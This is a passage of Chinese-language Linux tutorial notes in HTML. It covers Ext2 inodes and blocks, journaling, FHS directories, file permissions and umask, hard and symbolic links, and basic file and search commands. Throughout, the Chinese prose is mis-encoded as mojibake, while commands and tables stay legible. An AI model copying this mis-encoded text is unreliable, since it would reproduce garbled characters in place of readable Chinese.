<li>inodeï¼šä¸€ä¸ªæ–‡ä»¶å ç”¨ä¸€ä¸ª inodeï¼Œè®°å½•æ–‡ä»¶çš„å±æ€§ï¼ŒåŒæ—¶è®°å½•æ­¤æ–‡ä»¶çš„å†…å®¹æ‰€åœ¨çš„ block ç¼–å·ï¼›</li>
<li>blockï¼šè®°å½•æ–‡ä»¶çš„å†…å®¹ï¼Œæ–‡ä»¶å¤ªå¤§æ—¶ï¼Œä¼šå ç”¨å¤šä¸ª blockã€‚</li>
</ul>
<p>é™¤æ­¤ä¹‹å¤–è¿˜åŒ…æ‹¬ï¼š</p>
<ul>
<li>superblockï¼šè®°å½•æ–‡ä»¶ç³»ç»Ÿçš„æ•´ä½“ä¿¡æ¯ï¼ŒåŒ…æ‹¬ inode å’Œ block çš„æ€»é‡ã€ä½¿ç”¨é‡ã€å‰©ä½™é‡ï¼Œä»¥åŠæ–‡ä»¶ç³»ç»Ÿçš„æ ¼å¼ä¸ç›¸å…³ä¿¡æ¯ç­‰ï¼›</li>
<li>block bitmapï¼šè®°å½• block æ˜¯å¦è¢«ä½¿ç”¨çš„ä½å›¾ã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/BSD_disk.png" width="800"/> </div><br>
<h2 id="æ–‡ä»¶è¯»å–" tabindex="-1"> æ–‡ä»¶è¯»å–</h2>
<p>å¯¹äº Ext2 æ–‡ä»¶ç³»ç»Ÿï¼Œå½“è¦è¯»å–ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹æ—¶ï¼Œå…ˆåœ¨ inode ä¸­æŸ¥æ‰¾æ–‡ä»¶å†…å®¹æ‰€åœ¨çš„æ‰€æœ‰ blockï¼Œç„¶åæŠŠæ‰€æœ‰ block çš„å†…å®¹è¯»å‡ºæ¥ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/12a65cc6-20e0-4706-9fe6-3ba49413d7f6.png" width="500px"> </div><br>
<p>è€Œå¯¹äº FAT æ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒæ²¡æœ‰ inodeï¼Œæ¯ä¸ª block ä¸­å­˜å‚¨ç€ä¸‹ä¸€ä¸ª block çš„ç¼–å·ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/5b718e86-7102-4bb6-8ca5-d1dd791530c5.png" width="500px"> </div><br>
<h2 id="ç£ç›˜ç¢ç‰‡" tabindex="-1"> ç£ç›˜ç¢ç‰‡</h2>
<p>æŒ‡ä¸€ä¸ªæ–‡ä»¶å†…å®¹æ‰€åœ¨çš„ block è¿‡äºåˆ†æ•£ï¼Œå¯¼è‡´ç£ç›˜ç£å¤´ç§»åŠ¨è·ç¦»è¿‡å¤§ï¼Œä»è€Œé™ä½ç£ç›˜è¯»å†™æ€§èƒ½ã€‚</p>
<h2 id="block" tabindex="-1"> block</h2>
<p>åœ¨ Ext2 æ–‡ä»¶ç³»ç»Ÿä¸­æ‰€æ”¯æŒçš„ block å¤§å°æœ‰ 1Kï¼Œ2K åŠ 4K ä¸‰ç§ï¼Œä¸åŒçš„å¤§å°é™åˆ¶äº†å•ä¸ªæ–‡ä»¶å’Œæ–‡ä»¶ç³»ç»Ÿçš„æœ€å¤§å¤§å°ã€‚</p>
<table>
<thead>
<tr>
<th style="text-align:center">å¤§å°</th>
<th style="text-align:center">1KB</th>
<th style="text-align:center">2KB</th>
<th style="text-align:center">4KB</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">æœ€å¤§å•ä¸€æ–‡ä»¶</td>
<td style="text-align:center">16GB</td>
<td style="text-align:center">256GB</td>
<td style="text-align:center">2TB</td>
</tr>
<tr>
<td style="text-align:center">æœ€å¤§æ–‡ä»¶ç³»ç»Ÿ</td>
<td style="text-align:center">2TB</td>
<td style="text-align:center">8TB</td>
<td style="text-align:center">16TB</td>
</tr>
</tbody>
</table>
<p>ä¸€ä¸ª block åªèƒ½è¢«ä¸€ä¸ªæ–‡ä»¶æ‰€ä½¿ç”¨ï¼Œæœªä½¿ç”¨çš„éƒ¨åˆ†ç›´æ¥æµªè´¹äº†ã€‚å› æ­¤å¦‚æœéœ€è¦å­˜å‚¨å¤§é‡çš„å°æ–‡ä»¶ï¼Œé‚£ä¹ˆæœ€å¥½é€‰ç”¨æ¯”è¾ƒå°çš„ blockã€‚</p>
<h2 id="inode" tabindex="-1"> inode</h2>
<p>inode å…·ä½“åŒ…å«ä»¥ä¸‹ä¿¡æ¯ï¼š</p>
<ul>
<li>æƒé™ (read/write/excute)ï¼›</li>
<li>æ‹¥æœ‰è€…ä¸ç¾¤ç»„ (owner/group)ï¼›</li>
<li>å®¹é‡ï¼›</li>
<li>å»ºç«‹æˆ–çŠ¶æ€æ”¹å˜çš„æ—¶é—´ (ctime)ï¼›</li>
<li>æœ€è¿‘è¯»å–æ—¶é—´ (atime)ï¼›</li>
<li>æœ€è¿‘ä¿®æ”¹æ—¶é—´ (mtime)ï¼›</li>
<li>å®šä¹‰æ–‡ä»¶ç‰¹æ€§çš„æ——æ ‡ (flag)ï¼Œå¦‚ SetUID...ï¼›</li>
<li>è¯¥æ–‡ä»¶çœŸæ­£å†…å®¹çš„æŒ‡å‘ (pointer)ã€‚</li>
</ul>
<p>inode å…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š</p>
<ul>
<li>æ¯ä¸ª inode å¤§å°å‡å›ºå®šä¸º 128 bytes (æ–°çš„ ext4 ä¸ xfs å¯è®¾å®šåˆ° 256 bytes)ï¼›</li>
<li>æ¯ä¸ªæ–‡ä»¶éƒ½ä»…ä¼šå ç”¨ä¸€ä¸ª inodeã€‚</li>
</ul>
<p>inode ä¸­è®°å½•äº†æ–‡ä»¶å†…å®¹æ‰€åœ¨çš„ block ç¼–å·ï¼Œä½†æ˜¯æ¯ä¸ª block éå¸¸å°ï¼Œä¸€ä¸ªå¤§æ–‡ä»¶éšä¾¿éƒ½éœ€è¦å‡ åä¸‡çš„ blockã€‚è€Œä¸€ä¸ª inode å¤§å°æœ‰é™ï¼Œæ— æ³•ç›´æ¥å¼•ç”¨è¿™ä¹ˆå¤š block ç¼–å·ã€‚å› æ­¤å¼•å…¥äº†é—´æ¥ã€åŒé—´æ¥ã€ä¸‰é—´æ¥å¼•ç”¨ã€‚é—´æ¥å¼•ç”¨è®© inode è®°å½•çš„å¼•ç”¨ block å—è®°å½•å¼•ç”¨ä¿¡æ¯ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/inode_with_signatures.jpg" width="600"/> </div><br>
<h2 id="ç›®å½•" tabindex="-1"> ç›®å½•</h2>
<p>å»ºç«‹ä¸€ä¸ªç›®å½•æ—¶ï¼Œä¼šåˆ†é…ä¸€ä¸ª inode ä¸è‡³å°‘ä¸€ä¸ª blockã€‚block è®°å½•çš„å†…å®¹æ˜¯ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶çš„ inode ç¼–å·ä»¥åŠæ–‡ä»¶åã€‚</p>
<p>å¯ä»¥çœ‹åˆ°æ–‡ä»¶çš„ inode æœ¬èº«ä¸è®°å½•æ–‡ä»¶åï¼Œæ–‡ä»¶åè®°å½•åœ¨ç›®å½•ä¸­ï¼Œå› æ­¤æ–°å¢æ–‡ä»¶ã€åˆ é™¤æ–‡ä»¶ã€æ›´æ”¹æ–‡ä»¶åè¿™äº›æ“ä½œä¸ç›®å½•çš„å†™æƒé™æœ‰å…³ã€‚</p>
<h2 id="æ—¥å¿—" tabindex="-1"> æ—¥å¿—</h2>
<p>å¦‚æœçªç„¶æ–­ç”µï¼Œé‚£ä¹ˆæ–‡ä»¶ç³»ç»Ÿä¼šå‘ç”Ÿé”™è¯¯ï¼Œä¾‹å¦‚æ–­ç”µå‰åªä¿®æ”¹äº† block bitmapï¼Œè€Œè¿˜æ²¡æœ‰å°†æ•°æ®çœŸæ­£å†™å…¥ block ä¸­ã€‚</p>
<p>ext3/ext4 æ–‡ä»¶ç³»ç»Ÿå¼•å…¥äº†æ—¥å¿—åŠŸèƒ½ï¼Œå¯ä»¥åˆ©ç”¨æ—¥å¿—æ¥ä¿®å¤æ–‡ä»¶ç³»ç»Ÿã€‚</p>
<h2 id="æŒ‚è½½" tabindex="-1"> æŒ‚è½½</h2>
<p>æŒ‚è½½åˆ©ç”¨ç›®å½•ä½œä¸ºæ–‡ä»¶ç³»ç»Ÿçš„è¿›å…¥ç‚¹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¿›å…¥ç›®å½•ä¹‹åå°±å¯ä»¥è¯»å–æ–‡ä»¶ç³»ç»Ÿçš„æ•°æ®ã€‚</p>
<h2 id="ç›®å½•é…ç½®" tabindex="-1"> ç›®å½•é…ç½®</h2>
<p>ä¸ºäº†ä½¿ä¸åŒ Linux å‘è¡Œç‰ˆæœ¬çš„ç›®å½•ç»“æ„ä¿æŒä¸€è‡´æ€§ï¼ŒFilesystem Hierarchy Standard (FHS) è§„å®šäº† Linux çš„ç›®å½•ç»“æ„ã€‚æœ€åŸºç¡€çš„ä¸‰ä¸ªç›®å½•å¦‚ä¸‹ï¼š</p>
<ul>
<li>/ (root, æ ¹ç›®å½•)</li>
<li>/usr (unix software resource)ï¼šæ‰€æœ‰ç³»ç»Ÿé»˜è®¤è½¯ä»¶éƒ½ä¼šå®‰è£…åˆ°è¿™ä¸ªç›®å½•ï¼›</li>
<li>/var (variable)ï¼šå­˜æ”¾ç³»ç»Ÿæˆ–ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­çš„æ•°æ®æ–‡ä»¶ã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/linux-filesystem.png" width=""/> </div><br>
<h1 id="äº”ã€æ–‡ä»¶" tabindex="-1"> äº”ã€æ–‡ä»¶</h1>
<h2 id="æ–‡ä»¶å±æ€§" tabindex="-1"> æ–‡ä»¶å±æ€§</h2>
<p>ç”¨æˆ·åˆ†ä¸ºä¸‰ç§ï¼šæ–‡ä»¶æ‹¥æœ‰è€…ã€ç¾¤ç»„ä»¥åŠå…¶å®ƒäººï¼Œå¯¹ä¸åŒçš„ç”¨æˆ·æœ‰ä¸åŒçš„æ–‡ä»¶æƒé™ã€‚</p>
<p>ä½¿ç”¨ ls æŸ¥çœ‹ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œä¼šæ˜¾ç¤ºä¸€ä¸ªæ–‡ä»¶çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ <code>drwxr-xr-x 3 root root 17 May 6 00:14 .config</code>ï¼Œå¯¹è¿™ä¸ªä¿¡æ¯çš„è§£é‡Šå¦‚ä¸‹ï¼š</p>
<ul>
<li>drwxr-xr-xï¼šæ–‡ä»¶ç±»å‹ä»¥åŠæƒé™ï¼Œç¬¬ 1 ä½ä¸ºæ–‡ä»¶ç±»å‹å­—æ®µï¼Œå 9 ä½ä¸ºæ–‡ä»¶æƒé™å­—æ®µ</li>
<li>3ï¼šé“¾æ¥æ•°</li>
<li>rootï¼šæ–‡ä»¶æ‹¥æœ‰è€…</li>
<li>rootï¼šæ‰€å±ç¾¤ç»„</li>
<li>17ï¼šæ–‡ä»¶å¤§å°</li>
<li>May 6 00:14ï¼šæ–‡ä»¶æœ€åè¢«ä¿®æ”¹çš„æ—¶é—´</li>
<li>.configï¼šæ–‡ä»¶å</li>
</ul>
<p>å¸¸è§çš„æ–‡ä»¶ç±»å‹åŠå…¶å«ä¹‰æœ‰ï¼š</p>
<ul>
<li>dï¼šç›®å½•</li>
<li>-ï¼šæ–‡ä»¶</li>
<li>lï¼šé“¾æ¥æ–‡ä»¶</li>
</ul>
<p>9 ä½çš„æ–‡ä»¶æƒé™å­—æ®µä¸­ï¼Œæ¯ 3 ä¸ªä¸ºä¸€ç»„ï¼Œå…± 3 ç»„ï¼Œæ¯ä¸€ç»„åˆ†åˆ«ä»£è¡¨å¯¹æ–‡ä»¶æ‹¥æœ‰è€…ã€æ‰€å±ç¾¤ç»„ä»¥åŠå…¶å®ƒäººçš„æ–‡ä»¶æƒé™ã€‚ä¸€ç»„æƒé™ä¸­çš„ 3 ä½åˆ†åˆ«ä¸º rã€wã€x æƒé™ï¼Œè¡¨ç¤ºå¯è¯»ã€å¯å†™ã€å¯æ‰§è¡Œã€‚</p>
<p>æ–‡ä»¶æ—¶é—´æœ‰ä»¥ä¸‹ä¸‰ç§ï¼š</p>
<ul>
<li>modification time (mtime)ï¼šæ–‡ä»¶çš„å†…å®¹æ›´æ–°å°±ä¼šæ›´æ–°ï¼›</li>
<li>status time (ctime)ï¼šæ–‡ä»¶çš„çŠ¶æ€ï¼ˆæƒé™ã€å±æ€§ï¼‰æ›´æ–°å°±ä¼šæ›´æ–°ï¼›</li>
<li>access time (atime)ï¼šè¯»å–æ–‡ä»¶æ—¶å°±ä¼šæ›´æ–°ã€‚</li>
</ul>
<h2 id="æ–‡ä»¶ä¸ç›®å½•çš„åŸºæœ¬æ“ä½œ" tabindex="-1"> æ–‡ä»¶ä¸ç›®å½•çš„åŸºæœ¬æ“ä½œ</h2>
<h3 id="_1-ls" tabindex="-1"> 1. ls</h3>
<p>åˆ—å‡ºæ–‡ä»¶æˆ–è€…ç›®å½•çš„ä¿¡æ¯ï¼Œç›®å½•çš„ä¿¡æ¯å°±æ˜¯å…¶ä¸­åŒ…å«çš„æ–‡ä»¶ã€‚</p>
<div><pre><code># ls [-aAdfFhilnrRSt] file|dir
-a ï¼šåˆ—å‡ºå…¨éƒ¨çš„æ–‡ä»¶
-d ï¼šä»…åˆ—å‡ºç›®å½•æœ¬èº«
-l ï¼šä»¥é•¿æ•°æ®ä¸²è¡Œåˆ—å‡ºï¼ŒåŒ…å«æ–‡ä»¶çš„å±æ€§ä¸æƒé™ç­‰ç­‰æ•°æ®
</code></pre></div><h3 id="_2-cd" tabindex="-1"> 2. cd</h3>
<p>æ›´æ¢å½“å‰ç›®å½•ã€‚</p>
<div><pre><code>cd [ç›¸å¯¹è·¯å¾„æˆ–ç»å¯¹è·¯å¾„]
</code></pre></div><h3 id="_3-mkdir" tabindex="-1"> 3. mkdir</h3>
<p>åˆ›å»ºç›®å½•ã€‚</p>
<div><pre><code># mkdir [-mp] ç›®å½•åç§°
-m ï¼šé…ç½®ç›®å½•æƒé™
-p ï¼šé€’å½’åˆ›å»ºç›®å½•
</code></pre></div><h3 id="_4-rmdir" tabindex="-1"> 4. rmdir</h3>
<p>åˆ é™¤ç›®å½•ï¼Œç›®å½•å¿…é¡»ä¸ºç©ºã€‚</p>
<div><pre><code>rmdir [-p] ç›®å½•åç§°
-p ï¼šé€’å½’åˆ é™¤ç›®å½•
</code></pre></div><h3 id="_5-touch" tabindex="-1"> 5. touch</h3>
<p>æ›´æ–°æ–‡ä»¶æ—¶é—´æˆ–è€…å»ºç«‹æ–°æ–‡ä»¶ã€‚</p>
<div><pre><code># touch [-acdmt] filename
-a ï¼š æ›´æ–° atime
-c ï¼š æ›´æ–° ctimeï¼Œè‹¥è¯¥æ–‡ä»¶ä¸å­˜åœ¨åˆ™ä¸å»ºç«‹æ–°æ–‡ä»¶
-m ï¼š æ›´æ–° mtime
-d ï¼š åé¢å¯ä»¥æ¥æ›´æ–°æ—¥æœŸè€Œä¸ä½¿ç”¨å½“å‰æ—¥æœŸï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ --date="æ—¥æœŸæˆ–æ—¶é—´"
-t ï¼š åé¢å¯ä»¥æ¥æ›´æ–°æ—¶é—´è€Œä¸ä½¿ç”¨å½“å‰æ—¶é—´ï¼Œæ ¼å¼ä¸º[YYYYMMDDhhmm]
</code></pre></div><h3 id="_6-cp" tabindex="-1"> 6. cp</h3>
<p>å¤åˆ¶æ–‡ä»¶ã€‚å¦‚æœæºæ–‡ä»¶æœ‰ä¸¤ä¸ªä»¥ä¸Šï¼Œåˆ™ç›®çš„æ–‡ä»¶ä¸€å®šè¦æ˜¯ç›®å½•æ‰è¡Œã€‚</p>
<div><pre><code>cp [-adfilprsu] source destination
-a ï¼šç›¸å½“äº -dr --preserve=all
-d ï¼šè‹¥æ¥æºæ–‡ä»¶ä¸ºé“¾æ¥æ–‡ä»¶ï¼Œåˆ™å¤åˆ¶é“¾æ¥æ–‡ä»¶å±æ€§è€Œéæ–‡ä»¶æœ¬èº«
-i ï¼šè‹¥ç›®æ ‡æ–‡ä»¶å·²ç»å­˜åœ¨æ—¶ï¼Œåœ¨è¦†ç›–å‰ä¼šå…ˆè¯¢é—®
-p ï¼šè¿åŒæ–‡ä»¶çš„å±æ€§ä¸€èµ·å¤åˆ¶è¿‡å»
-r ï¼šé€’å½’å¤åˆ¶
-u ï¼šdestination æ¯” source æ—§æ‰æ›´æ–° destinationï¼Œæˆ– destination ä¸å­˜åœ¨çš„æƒ…å†µä¸‹æ‰å¤åˆ¶
--preserve=all ï¼šé™¤äº† -p çš„æƒé™ç›¸å…³å‚æ•°å¤–ï¼Œè¿˜åŠ å…¥ SELinux çš„å±æ€§, links, xattr ç­‰ä¹Ÿå¤åˆ¶äº†
</code></pre></div><h3 id="_7-rm" tabindex="-1"> 7. rm</h3>
<p>åˆ é™¤æ–‡ä»¶ã€‚</p>
<div><pre><code># rm [-fir] æ–‡ä»¶æˆ–ç›®å½•
-r ï¼šé€’å½’åˆ é™¤
</code></pre></div><h3 id="_8-mv" tabindex="-1"> 8. mv</h3>
<p>ç§»åŠ¨æ–‡ä»¶ã€‚</p>
<div><pre><code># mv [-fiu] source destination
# mv [options] source1 source2 source3 .... directory
-f ï¼š force å¼ºåˆ¶çš„æ„æ€ï¼Œå¦‚æœç›®æ ‡æ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œä¸ä¼šè¯¢é—®è€Œç›´æ¥è¦†ç›–
</code></pre></div><h2 id="ä¿®æ”¹æƒé™" tabindex="-1"> ä¿®æ”¹æƒé™</h2>
<p>å¯ä»¥å°†ä¸€ç»„æƒé™ç”¨æ•°å­—æ¥è¡¨ç¤ºï¼Œæ­¤æ—¶ä¸€ç»„æƒé™çš„ 3 ä¸ªä½å½“åšäºŒè¿›åˆ¶æ•°å­—çš„ä½ï¼Œä»å·¦åˆ°å³æ¯ä¸ªä½çš„æƒå€¼ä¸º 4ã€2ã€1ï¼Œå³æ¯ä¸ªæƒé™å¯¹åº”çš„æ•°å­—æƒå€¼ä¸º r : 4ã€w : 2ã€x : 1ã€‚</p>
<div><pre><code># chmod [-R] xyz dirname/filename
</code></pre></div><p>ç¤ºä¾‹ï¼šå°† .bashrc æ–‡ä»¶çš„æƒé™ä¿®æ”¹ä¸º -rwxr-xr--ã€‚</p>
<div><pre><code># chmod 754 .bashrc
</code></pre></div><p>ä¹Ÿå¯ä»¥ä½¿ç”¨ç¬¦å·æ¥è®¾å®šæƒé™ã€‚</p>
<div><pre><code># chmod [ugoa]  [+-=] [rwx] dirname/filename
- uï¼šæ‹¥æœ‰è€…
- gï¼šæ‰€å±ç¾¤ç»„
- oï¼šå…¶ä»–äºº
- aï¼šæ‰€æœ‰äºº
- +ï¼šæ·»åŠ æƒé™
- -ï¼šç§»é™¤æƒé™
- =ï¼šè®¾å®šæƒé™
</code></pre></div><p>ç¤ºä¾‹ï¼šä¸º .bashrc æ–‡ä»¶çš„æ‰€æœ‰ç”¨æˆ·æ·»åŠ å†™æƒé™ã€‚</p>
<div><pre><code># chmod a+w .bashrc
</code></pre></div><h2 id="é»˜è®¤æƒé™" tabindex="-1"> é»˜è®¤æƒé™</h2>
<ul>
<li>æ–‡ä»¶é»˜è®¤æƒé™ï¼šæ–‡ä»¶é»˜è®¤æ²¡æœ‰å¯æ‰§è¡Œæƒé™ï¼Œå› æ­¤ä¸º 666ï¼Œä¹Ÿå°±æ˜¯ -rw-rw-rw- ã€‚</li>
<li>ç›®å½•é»˜è®¤æƒé™ï¼šç›®å½•å¿…é¡»è¦èƒ½å¤Ÿè¿›å…¥ï¼Œä¹Ÿå°±æ˜¯å¿…é¡»æ‹¥æœ‰å¯æ‰§è¡Œæƒé™ï¼Œå› æ­¤ä¸º 777 ï¼Œä¹Ÿå°±æ˜¯ drwxrwxrwxã€‚</li>
</ul>
<p>å¯ä»¥é€šè¿‡ umask è®¾ç½®æˆ–è€…æŸ¥çœ‹é»˜è®¤æƒé™ï¼Œé€šå¸¸ä»¥æ©ç çš„å½¢å¼æ¥è¡¨ç¤ºï¼Œä¾‹å¦‚ 002 è¡¨ç¤ºå…¶å®ƒç”¨æˆ·çš„æƒé™å»é™¤äº†ä¸€ä¸ª 2 çš„æƒé™ï¼Œä¹Ÿå°±æ˜¯å†™æƒé™ï¼Œå› æ­¤å»ºç«‹æ–°æ–‡ä»¶æ—¶é»˜è®¤çš„æƒé™ä¸º -rw-rw-r--ã€‚</p>
<h2 id="ç›®å½•çš„æƒé™" tabindex="-1"> ç›®å½•çš„æƒé™</h2>
<p>æ–‡ä»¶åä¸æ˜¯å­˜å‚¨åœ¨ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹ä¸­ï¼Œè€Œæ˜¯å­˜å‚¨åœ¨ä¸€ä¸ªæ–‡ä»¶æ‰€åœ¨çš„ç›®å½•ä¸­ã€‚å› æ­¤ï¼Œæ‹¥æœ‰æ–‡ä»¶çš„ w æƒé™å¹¶ä¸èƒ½å¯¹æ–‡ä»¶åè¿›è¡Œä¿®æ”¹ã€‚</p>
<p>ç›®å½•å­˜å‚¨æ–‡ä»¶åˆ—è¡¨ï¼Œä¸€ä¸ªç›®å½•çš„æƒé™ä¹Ÿå°±æ˜¯å¯¹å…¶æ–‡ä»¶åˆ—è¡¨çš„æƒé™ã€‚å› æ­¤ï¼Œç›®å½•çš„ r æƒé™è¡¨ç¤ºå¯ä»¥è¯»å–æ–‡ä»¶åˆ—è¡¨ï¼›w æƒé™è¡¨ç¤ºå¯ä»¥ä¿®æ”¹æ–‡ä»¶åˆ—è¡¨ï¼Œå…·ä½“æ¥è¯´ï¼Œå°±æ˜¯æ·»åŠ åˆ é™¤æ–‡ä»¶ï¼Œå¯¹æ–‡ä»¶åè¿›è¡Œä¿®æ”¹ï¼›x æƒé™å¯ä»¥è®©è¯¥ç›®å½•æˆä¸ºå·¥ä½œç›®å½•ï¼Œx æƒé™æ˜¯ r å’Œ w æƒé™çš„åŸºç¡€ï¼Œå¦‚æœä¸èƒ½ä½¿ä¸€ä¸ªç›®å½•æˆä¸ºå·¥ä½œç›®å½•ï¼Œä¹Ÿå°±æ²¡åŠæ³•è¯»å–æ–‡ä»¶åˆ—è¡¨ä»¥åŠå¯¹æ–‡ä»¶åˆ—è¡¨è¿›è¡Œä¿®æ”¹äº†ã€‚</p>
<h2 id="é“¾æ¥" tabindex="-1"> é“¾æ¥</h2>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1e46fd03-0cda-4d60-9b1c-0c256edaf6b2.png" width="450px"> </div><br>
<div><pre><code># ln [-sf] source_filename dist_filename
-s ï¼šé»˜è®¤æ˜¯å®ä½“é“¾æ¥ï¼ŒåŠ  -s ä¸ºç¬¦å·é“¾æ¥
-f ï¼šå¦‚æœç›®æ ‡æ–‡ä»¶å­˜åœ¨æ—¶ï¼Œå…ˆåˆ é™¤ç›®æ ‡æ–‡ä»¶
</code></pre></div><h3 id="_1-å®ä½“é“¾æ¥" tabindex="-1"> 1. å®ä½“é“¾æ¥</h3>
<p>åœ¨ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæ¡ç›®ï¼Œè®°å½•ç€æ–‡ä»¶åä¸ inode ç¼–å·ï¼Œè¿™ä¸ª inode å°±æ˜¯æºæ–‡ä»¶çš„ inodeã€‚</p>
<p>åˆ é™¤ä»»æ„ä¸€ä¸ªæ¡ç›®ï¼Œæ–‡ä»¶è¿˜æ˜¯å­˜åœ¨ï¼Œåªè¦å¼•ç”¨æ•°é‡ä¸ä¸º 0ã€‚</p>
<p>æœ‰ä»¥ä¸‹é™åˆ¶ï¼šä¸èƒ½è·¨è¶Šæ–‡ä»¶ç³»ç»Ÿã€ä¸èƒ½å¯¹ç›®å½•è¿›è¡Œé“¾æ¥ã€‚</p>
<div><pre><code># ln /etc/crontab .
# ll -i /etc/crontab crontab
34474855 -rw-r--r--. 2 root root 451 Jun 10 2014 crontab
34474855 -rw-r--r--. 2 root root 451 Jun 10 2014 /etc/crontab
</code></pre></div><h3 id="_2-ç¬¦å·é“¾æ¥" tabindex="-1"> 2. ç¬¦å·é“¾æ¥</h3>
<p>ç¬¦å·é“¾æ¥æ–‡ä»¶ä¿å­˜ç€æºæ–‡ä»¶æ‰€åœ¨çš„ç»å¯¹è·¯å¾„ï¼Œåœ¨è¯»å–æ—¶ä¼šå®šä½åˆ°æºæ–‡ä»¶ä¸Šï¼Œå¯ä»¥ç†è§£ä¸º Windows çš„å¿«æ·æ–¹å¼ã€‚</p>
<p>å½“æºæ–‡ä»¶è¢«åˆ é™¤äº†ï¼Œé“¾æ¥æ–‡ä»¶å°±æ‰“ä¸å¼€äº†ã€‚</p>
<p>å› ä¸ºè®°å½•çš„æ˜¯è·¯å¾„ï¼Œæ‰€ä»¥å¯ä»¥ä¸ºç›®å½•å»ºç«‹ç¬¦å·é“¾æ¥ã€‚</p>
<div><pre><code># ll -i /etc/crontab /root/crontab2
34474855 -rw-r--r--. 2 root root 451 Jun 10 2014 /etc/crontab
53745909 lrwxrwxrwx. 1 root root 12 Jun 23 22:31 /root/crontab2 -> /etc/crontab
</code></pre></div><h2 id="è·å–æ–‡ä»¶å†…å®¹" tabindex="-1"> è·å–æ–‡ä»¶å†…å®¹</h2>
<h3 id="_1-cat" tabindex="-1"> 1. cat</h3>
<p>å–å¾—æ–‡ä»¶å†…å®¹ã€‚</p>
<div><pre><code># cat [-AbEnTv] filename
-n ï¼šæ‰“å°å‡ºè¡Œå·ï¼Œè¿åŒç©ºç™½è¡Œä¹Ÿä¼šæœ‰è¡Œå·ï¼Œ-b ä¸ä¼š
</code></pre></div><h3 id="_2-tac" tabindex="-1"> 2. tac</h3>
<p>æ˜¯ cat çš„åå‘æ“ä½œï¼Œä»æœ€åä¸€è¡Œå¼€å§‹æ‰“å°ã€‚</p>
<h3 id="_3-more" tabindex="-1"> 3. more</h3>
<p>å’Œ cat ä¸åŒçš„æ˜¯å®ƒå¯ä»¥ä¸€é¡µä¸€é¡µæŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼Œæ¯”è¾ƒé€‚åˆå¤§æ–‡ä»¶çš„æŸ¥çœ‹ã€‚</p>
<h3 id="_4-less" tabindex="-1"> 4. less</h3>
<p>å’Œ more ç±»ä¼¼ï¼Œä½†æ˜¯å¤šäº†ä¸€ä¸ªå‘å‰ç¿»é¡µçš„åŠŸèƒ½ã€‚</p>
<h3 id="_5-head" tabindex="-1"> 5. head</h3>
<p>å–å¾—æ–‡ä»¶å‰å‡ è¡Œã€‚</p>
<div><pre><code># head [-n number] filename
-n ï¼šåé¢æ¥æ•°å­—ï¼Œä»£è¡¨æ˜¾ç¤ºå‡ è¡Œçš„æ„æ€
</code></pre></div><h3 id="_6-tail" tabindex="-1"> 6. tail</h3>
<p>æ˜¯ head çš„åå‘æ“ä½œï¼Œåªæ˜¯å–å¾—æ˜¯åå‡ è¡Œã€‚</p>
<h3 id="_7-od" tabindex="-1"> 7. od</h3>
<p>ä»¥å­—ç¬¦æˆ–è€…åå…­è¿›åˆ¶çš„å½¢å¼æ˜¾ç¤ºäºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p>
<h2 id="æŒ‡ä»¤ä¸æ–‡ä»¶æœç´¢" tabindex="-1"> æŒ‡ä»¤ä¸æ–‡ä»¶æœç´¢</h2>
<h3 id="_1-which" tabindex="-1"> 1. which</h3>
<p>æŒ‡ä»¤æœç´¢ã€‚</p>
<div><pre><code># which [-a] command
-a ï¼šå°†æ‰€æœ‰æŒ‡ä»¤åˆ—å‡ºï¼Œè€Œä¸æ˜¯åªåˆ—ç¬¬ä¸€ä¸ª
</code></pre></div><h3 id="_2-whereis" tabindex="-1"> 2. whereis</h3>
<p>æ–‡ä»¶æœç´¢ã€‚é€Ÿåº¦æ¯”è¾ƒå¿«ï¼Œå› ä¸ºå®ƒåªæœç´¢å‡ ä¸ªç‰¹å®šçš„ç›®å½•ã€‚</p>
<div><pre><code># whereis [-bmsu] dirname/filename
</code></pre></div><h3 id="_3-locate" tabindex="-1"> 3. locate</h3>
<p>æ–‡ä»¶æœç´¢ã€‚å¯ä»¥ç”¨å…³é”®å­—æˆ–è€…æ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œæœç´¢ã€‚</p>
<p>locate ä½¿ç”¨ /var/lib/mlocate/ è¿™ä¸ªæ•°æ®åº“æ¥è¿›è¡Œæœç´¢ï¼Œå®ƒå­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œå¹¶ä¸”æ¯å¤©æ›´æ–°ä¸€æ¬¡ï¼Œæ‰€ä»¥æ— æ³•ç”¨ locate æœç´¢æ–°å»ºçš„æ–‡ä»¶ã€‚å¯ä»¥ä½¿ç”¨ updatedb æ¥ç«‹å³æ›´æ–°æ•°æ®åº“ã€‚</p>
<div><pre><code># locate [-ir] keyword
-rï¼šæ­£åˆ™è¡¨è¾¾å¼
</code></pre></div><h3 id="_4-find" tabindex="-1"> 4. find</h3>
<p>æ–‡ä»¶æœç´¢ã€‚å¯ä»¥ä½¿ç”¨æ–‡ä»¶çš„å±æ€§å’Œæƒé™è¿›è¡Œæœç´¢ã€‚</p>
<div><pre><code># find [basedir] [option]
example: find . -name "shadow*"
